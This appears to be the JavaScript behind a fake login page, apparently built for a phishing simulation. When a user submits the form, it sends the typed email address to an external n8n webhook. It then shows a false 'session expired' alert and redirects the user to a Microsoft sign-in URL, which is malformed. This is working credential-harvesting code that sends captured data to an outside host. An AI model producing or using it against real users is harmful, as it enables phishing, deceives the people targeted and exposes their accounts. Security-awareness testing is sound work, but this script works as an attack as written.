const TRACKING_URL = 'https://opiceblum.app.n8n.cloud/webhook/fc870a18-719e-4ad1-84f9-f503995fd4a4'; 
const TRAINING_URL = 'https://myaccount.https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=bb02d207-8d7a-4cf3-829f-81d7cdee1610&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0&x-client-OS=Windows%20Server%202019%20Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBzWJDMAAA4HfZ1YGWSByXsVaFYJqOG-onhJYajaff933MaxofnGdjm2rqfQrgHIMf5bLD40Sbcb1EPc8yEnMAL7psbkkyynUajEysiLmIvk5c6dLQXfgNQENafudWWi-24vyM38X69g-40o0wGFUtE_hWdVRxdfFYXoWtT8_1e9_0E19aPEXhticQgisW_iwqCqPOg3XBBsai3SzQtf8K5kzuZ6hVkZm4-jUQqAsJIQEqJsmn1DsNv0EiJwAQikRv2b-lauWEOg7ZPM8t37v1F_6UYDnlXa70XSXjTfpItHwpedHIdhKN296rw5-P71p7OQbs2mkaFvkjNVhO1c9aNR7snZaFquzcMxMbLHH_RdG5HCEKS6SpzTylDPU5tVoIMpOAuzzgF9mGOmqxMzzKWaf294hZ0tQ3syWsBh__-Pjdj4IBAAA&msaoauth2=true&instance_aware=true&lc=1046&ru=https%3A%2F%2Faccount.microsoft.com%2Faccount%2FAccount%3Fmkt%3Dpt-BR.com/?ref=amc.com';
const btnNext = document.querySelector(".btn-next");
const btnSigin = document.querySelector(".btn-sigin");
let emailDigitado = document.getElementById('emailInput').value;
let senhaDigitada = document.getElementById('passwordInput').value;
let dadosRastreio; 

btnNext.addEventListener('click', () => {
    console.log("teste");
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        
        loginForm.addEventListener('submit', function(event) {

            event.preventDefault(); 
            
 
            emailDigitado = document.getElementById('emailInput').value;
            

              dadosRastreio = {

                alvo_email: emailDigitado,
                
                evento: 'Tentativa_de_Login_Simulado',
                timestamp: new Date().toISOString()
            };
            

            fetch(TRACKING_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosRastreio)
            })
            .then(response => {
                console.log('Rastreamento de submissão enviado com sucesso.');
            })
            .catch(error => {
                console.error('Erro ao enviar dados de rastreamento:', error);
            })
            .finally(() => {
                alert("Sessão expirada. Redirecionando para a página inicial...");
                window.location.href = TRAINING_URL;
            });
        });
    }
});

btnSigin.addEventListener("click", () => {

    console.log("teste");
    
              fetch(TRACKING_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosRastreio)
            })
            .then(response => {
                console.log('Rastreamento de submissão enviado com sucesso.');
            })
            .catch(error => {
                console.error('Erro ao enviar dados de rastreamento:', error);
            })
            .finally(() => {
                alert("Sessão expirada. Redirecionando para a página inicial...");
                window.location.href = TRAINING_URL;
            });
})